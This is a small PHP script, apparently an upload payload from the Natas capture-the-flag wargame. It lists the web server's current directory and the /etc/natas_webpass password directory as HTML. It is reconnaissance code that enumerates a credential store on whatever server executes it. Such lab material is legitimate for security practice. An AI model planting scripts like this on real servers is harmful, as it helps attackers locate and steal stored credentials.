<?php

$arrHome = scandir('.');
$arrPasswd = scandir("/etc/natas_webpass");

echo "<ul> Current Durectory";

foreach ($arrHome as &$value) {
    echo "<li>{$value}</li>";
}

echo "</ul>";


echo "<ul> /etc/natas_webpass";

foreach ($arrPasswd as &$value) {
    echo "<li>{$value}</li>";
}

echo "</ul>";

?>
